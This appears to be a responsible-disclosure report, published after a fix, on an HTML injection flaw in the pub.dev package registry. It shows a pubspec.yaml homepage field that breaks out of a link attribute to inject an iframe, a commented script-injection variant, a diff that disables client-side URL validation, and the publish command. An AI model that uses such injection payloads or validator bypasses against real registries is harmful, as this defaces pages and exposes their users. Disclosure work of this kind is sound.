# Raport of security issue reported to google

Issue was fixed before publishing this on github

---
---
---

# IFRAME injection to pub.dev package registry

## instruction

Please consider this `pubspec.yaml`

```yaml
name: doggy_website
description: inject something
version: 1.5.0
homepage: 'https://dart.dev/" rel="ugc"> Flamingo or llama?  </a> <iframe width="560" height="315" src="https://www.youtube.com/embed/owsfdh4gxyc" frameborder="0" allowfullscreen></iframe>'
#homepage: 'https://dart.dev/" rel="ugc"> love letter </a> <script>console.log("llama");alert(1);</script>'

environment:
  sdk: '>=2.12.0 <3.0.0'

```

Please also consider publishing package by:
```bash
/home/n0npax/workspace/dart-lang-org/pub/bin/pub.exe publish -v --trace
```

Please focus on fact, `pub` is custom compiled `pub`. It contains this patch applied:
```diff
diff --git a/lib/src/validator/pubspec_field.dart b/lib/src/validator/pubspec_field.dart
index 8a5c23e4..25e103ad 100644
--- a/lib/src/validator/pubspec_field.dart
+++ b/lib/src/validator/pubspec_field.dart
@@ -15,7 +15,7 @@ class PubspecFieldValidator extends Validator {
   @override
   Future validate() {
     _validateFieldIsString('description');
-    _validateFieldUrl('homepage');
+    // _validateFieldUrl('homepage');
     _validateFieldUrl('repository');
     if (!_hasField('homepage') && !_hasField('repository')) {
       warnings.add(
```

to not disturb customer facing registry, lets assume you will run clone of registry on localhost and
```bash
export PUB_HOSTED_URL=http://localhost:8080
```
to ensure pub will use your dev registry.

## what has happened?

Once package is pushed you can see that iframe was injected.

![alt text](flamingos.png "Title")

## Why is has happened?

The only protection from doggy url was on client side. The url verification has not happened on server side.

## JS injection

JS injection is also possible, but harmless as per CSP policy